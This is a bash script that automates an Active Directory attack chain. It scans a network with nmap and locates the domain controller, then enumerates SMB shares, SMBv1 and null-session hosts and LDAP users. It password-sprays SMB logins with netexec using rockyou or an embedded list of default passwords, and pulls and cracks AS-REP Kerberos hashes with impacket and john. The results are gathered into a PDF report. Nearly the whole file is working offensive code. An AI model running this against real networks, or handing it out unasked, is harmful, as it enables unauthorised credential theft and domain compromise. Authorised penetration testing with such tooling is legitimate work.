#!/bin/bash

SCRIPT_ARGS=("$@")

declare -g range
declare -g save_folder
declare -g pass_list
declare -g domain_name
declare -g domain_ip 
declare -g ad_user
declare -g ad_password

function root_checker() {

if [ "$EUID" -eq 0 ]; then
   echo -e "Verification Complete!\nAccess Granted!\n"
else
   echo -e "Verification Failed!"
   read -p "The script requires root admin permissions. Do you want to run it as root? Press y to try again or n to exit (y/n): " res

   if [[ "$res" =~ ^[Yy]$ ]]; then
      exec sudo "$0" "${SCRIPT_ARGS[@]}"
   else
      echo "Script terminated.. Exiting..."
      exit 1
   fi
fi
}


function tool_installer() {

missing_tools=()

for x in nmap xsltproc netexec enum4linux rpcclient ldapdomaindump impacket-GetNPUsers hydra john enscript ghostscript
do
command -v $x &>/dev/null || missing_tools+=("$x")
done

if [ ${#missing_tools[@]} -gt 0 ]; then
   echo "Installing missing tools for script: ${missing_tools[*]}"
   apt-get update -y
   apt-get install -y "${missing_tools[@]}"
else
   echo "All tools are correctly installed within the system. Processing..."
fi
}


function user_input_validation() {

read -p "Please enter an IP range or subnet to begin scanning: " range

if [[ $range =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
   echo "You have entered a single IP address: $range"

elif [[ $range =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}-[0-9]{1,3}$ ]]; then
   echo "You have entered an IP address with a range limit: $range"

elif [[ $range =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[12][0-9]|3[0-2])$ ]]; then
   echo "You have entered an IP address with a CIDR range: $range"

else
   echo -e "The input you have entered is invalid.\nSession is now terminated! You can try again using a valid IP address."
   exit 1
fi

echo "Please enter a name for the folder where we will be storing all the extracted information:"
read -r save_folder

if [[ ! "$save_folder" =~ ^[a-zA-Z0-9_-]+$ ]]; then
   echo "Invalid folder name. Use only letters, numbers, hyphens and underscores."
   exit 1
fi

mkdir -p "$save_folder" || { echo "Failed to create folder '$save_folder'. Exiting..."; exit 1; }
}

function rockyou_checker() {
    echo "Attempting to locate rockyou.txt file in system. Please wait..."
    if find /usr/share/wordlists/ -name "rockyou.txt" | grep -q "rockyou.txt"; then
        echo "The rockyou.txt list was found!"
        pass_list="/usr/share/wordlists/rockyou.txt"
    else
        echo "The rockyou.txt was not found. Attempting to find its compressed version..."
        if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
            echo "rockyou.txt.gz was found! Decompressing rockyou.txt.gz..."
            gunzip /usr/share/wordlists/rockyou.txt.gz
            pass_list="/usr/share/wordlists/rockyou.txt"
        else
            echo "The rockyou wordlist is missing from this system."
            read -p "Would you like to use a default set list of passwords that will be generated using the script? (y/n): " rockyoudefaultplist
            if [[ "$rockyoudefaultplist" =~ ^[Yy]$ ]]; then
                cat > pt_bfpass.txt << 'PASSEOF'
123
1234
12345
123456
1234567
12345678
123456789
admin
root
toor
password
ubnt
pi
raspberry
qwerty
test
user
123123
111111
default
support
cisco
operator
alpine
webadmin
letmein
logon
Passw@rd
987654321
admin123
msfadmin
kali
PASSEOF

pass_list="pt_bfpass.txt"
            fi
        fi 
    fi 
}


function preparation() {

read -p "Enter the name of the DC (Domain Controller):" domain_name
read -p "Enter AD (Active Directory) username. You may leave this field blank to skip:" ad_user
read -p "Enter AD (Active Directory) password. You may leave this field blank to skip:" ad_password
echo

}

function mode_level() {

echo "*************************************************" >&2
echo "Press [B] for basic" >&2
echo "Press [I] for intermediate" >&2
echo "Press [A] for advanced" >&2
echo "Press [S] to skip and call the next mode" >&2
echo "*************************************************" >&2
read -r selection
echo "${selection^^}"

}

function scan_mode() {

local scan_level
scan_level=$(mode_level)

if [ "$scan_level" == "S" ]; then
echo "Skipping the scanning phase.. Continuing to enumaration."
return
fi

local extra_flags=""

if [ "$scan_level" == "B" ] || [ "$scan_level" == "I" ] || [ "$scan_level" == "A" ]; then
    echo "Applying basic scan flag: -Pn"
    extra_flags="-Pn"
fi

if [ "$scan_level" == "I" ] || [ "$scan_level" == "A" ]; then
    echo "Applying intermediate scan flag: adding -p-"
    extra_flags="$extra_flags -p-"
fi

if [ "$scan_level" == "A" ]; then
    echo "Applying advanced scan flag: adding -sU"
    extra_flags="$extra_flags -sU"
fi


echo "Proceeding with $scan_level scanning commands."

nmap $extra_flags -oX "$save_folder/nmap_res.xml" "$range"

echo "Converting XML results to HTML.."
xsltproc "$save_folder/nmap_res.xml" -o "$save_folder/nmap_rep.html"

grep -oP '(?<=addr=")[^"]+' "$save_folder/nmap_res.xml" | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | sort -u > "$save_folder/.pt_iplist"
cp "$save_folder/.pt_iplist" "$save_folder/live.ips"

echo "Host discovery is now complete! $(wc -l < "$save_folder/.pt_iplist") host(s) found & saved to .pt_iplist"

}

function enumeration_mode() {

local enumeration_level
enumeration_level=$(mode_level)

if [ "$enumeration_level" == "S" ]; then
echo "Skipping the enumeration phase.. Continuing to exploitation."
return
fi

if [ ! -f "$save_folder/nmap_res.xml" ]; then
   echo "nmap_res.xml not found. Please run the scanning phase first or provide the file manually."
   return
fi

echo "Proceeding with $enumeration_level level enumeration commands."

if [ "$enumeration_level" == "B" ] || [ "$enumeration_level" == "I" ] || [ "$enumeration_level" == "A" ]; then
    basic_enum
fi

if [ "$enumeration_level" == "I" ] || [ "$enumeration_level" == "A" ]; then
    inter_enum
fi

if [ "$enumeration_level" == "A" ]; then
    advanced_enum
fi
}

function basic_enum() {

grep -oP '(?<=addr=")[^"]+' "$save_folder/nmap_res.xml" | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | sort -u > "$save_folder/live.ips"

for ip in $(cat "$save_folder/live.ips")
do
	nmap "$ip" -Pn -sV > "$save_folder/$ip"
done

domain_ip=$(grep -il 'kerberos' "$save_folder/"[0-9]* 2>/dev/null | awk -F '/' '{print $2}')
echo "Domain IP address: $domain_ip"

dhcp_ip=$(nmap "$domain_ip" -sV --script=broadcast-dhcp-discover | grep -i "Server Identifier" | awk '{print $NF}')
echo "DHCP server IP address: $dhcp_ip"
}

function inter_enum() {

nmap "$domain_ip" -sV --script=ldap-search,smb-enum-shares > "$save_folder/domain_ext_scan.txt"

for p in 21 22 445 5985 3389
do
	echo "The following IP addresses have the following port on" | tee -a "$save_folder/open_ports.txt"
	grep -E "port|report" "$save_folder/nmap_res.xml" | grep -E "$p" -B 1 | grep "report" | awk '{print $NF}' | tee -a "$save_folder/open_ports.txt"
	echo
done

grep -E "port|report" "$save_folder/nmap_res.xml" | grep -E "445" -B 1 | grep "report" | awk '{print $NF}' > "$save_folder/smb_hosts_list.txt"
echo "A list of SMB hosts has been added to the folder."

nmap --script smb-protocols -p 445 -iL "$save_folder/smb_hosts_list.txt" | grep -E -B 5 "SMBv1" | grep "report" | awk '{print $NF}' > "$save_folder/SMBv1_hosts_list.txt"
echo "A list of SMBv1 hosts has been added to the folder."

while IFS= read -r ip; do
	result=$(rpcclient -U "" -N "$ip" -c "enumdomusers" 2>/dev/null)
	if [ -n "$result" ]; then
	   echo "$ip" >> "$save_folder/null_session_hosts.txt"
	fi
done < "$save_folder/smb_hosts_list.txt"
echo "A list of null session hosts has been added to the folder."

enum4linux -S "$domain_ip" > "$save_folder/enum4linux_shares.txt" 2>/dev/null
	
}

function advanced_enum() {

ldapdomaindump -u "$domain_name\\$ad_user" -p "$ad_password" "$domain_ip" -o "$save_folder/ldap/" 2>/dev/null

impacket-GetNPUsers "$domain_name/" -usersfile "$save_folder/adusers.txt" -dc-ip "$domain_ip" -no-pass > "$save_folder/asrep_hash.txt" 2>/dev/null

if [ -f "$save_folder/ldap/domain_users.json" ]; then
	grep -oP '"sAMAccountName":\s*\["\K[^"]+' "$save_folder/ldap/domain_users.json" > "$save_folder/adusers.txt"
	echo "Users list was saved to adusers.txt"
	else
	echo "ldap dump was not found. adusers.txt was not saved. further steps will be skipped!"
fi
}


function exploitation_mode() {

local exploitation_level
exploitation_level=$(mode_level)

if [ "$exploitation_level" == "S" ]; then
echo "Skipping exploitation phase.. Continuing to final PDF generation."
return
fi

echo "Proceeding with $exploitation_level level exploitation commands."

basic_exploit

if [ "$exploitation_level" == "I" ] || [ "$exploitation_level" == "A" ]; then
	intermediate_exploit
fi

if [ "$exploitation_level" == "A" ]; then
	advanced_exploit
fi
}


function basic_exploit() {

echo "Running vulnerability script against the domain.."
nmap "$domain_ip" -sV --script=vuln > "$save_folder/domain-vuln.txt"
echo "Vulnerability scan is complete! Results can be found inside the save folder in domain-vuln.txt!"
}

function intermediate_exploit() {

echo "Starting password spray attack.."

if [ -f "$save_folder/adusers.txt" ]; then
echo "Users file was found! Commencing attack with $pass_list."
netexec smb "$domain_ip" -u "$save_folder/adusers.txt" -p "$pass_list" -d "$domain_name" \
 --continue-on-success | grep -E '\+' >> "$save_folder/pass-att-results.txt"
 echo "Password spray attack was complete. Working login credentials were saved and can be found inside the save folder in pass-att-results.txt"
 else
 echo "User file was not found!"
fi
}
 
function advanced_exploit() {

echo "Commencing user ticket extraction and cracking.."

if [ -f "$save_folder/adusers.txt" ]; then
 echo "Users file was found! Attempting to extract ASREP hashes."

 echo "Attempting to fetch Kerberos tickets.."
 impacket-GetNPUsers "$domain_name/" \
 -usersfile "$save_folder/adusers.txt" \
 -dc-ip "$domain_ip" \
 -no-pass > "$save_folder/user_tickets.txt"
 
echo "Attempting to crack tickets using John.."

john "$save_folder/user_tickets.txt" \
--format=krb5asrep \
--wordlist="$pass_list" \
--show > "$save_folder/cracked_users.txt"

	echo "Operation is now complete! Results were saved and can be found inside the save folder in cracked_users.txt"

 else
	echo "No user file was found!"
fi
}

function pdfer() {

local report_txt="$save_folder/full_report.txt"
local report_ps="$save_folder/full_report.ps"
local report_pdf="$save_folder/full_report.pdf"

for f in "$save_folder/live.ips" "$save_folder/open_ports.txt" "$save_folder/smb_hosts_list.txt" "$save_folder/SMBv1_hosts_list.txt" "$save_folder/null_session_hosts.txt" "$save_folder/domain-vuln.txt" "$save_folder/pass-att-results.txt" "$save_folder/cracked_users.txt"
do
	if [ -f "$f" ]; then
		echo "*** $f ***" >> "$report_txt"
		cat "$f" >> "$report_txt"
		echo "" >> "$report_txt"
	fi
done

enscript "$report_txt" -p "$report_ps" 2>/dev/null
ps2pdf "$report_ps" "$report_pdf"
rm -f "$report_ps"

echo "Report was successfully saved!"
}


function main() {

root_checker
tool_installer
user_input_validation
rockyou_checker
preparation

scan_mode
enumeration_mode
exploitation_mode
pdfer
}

main
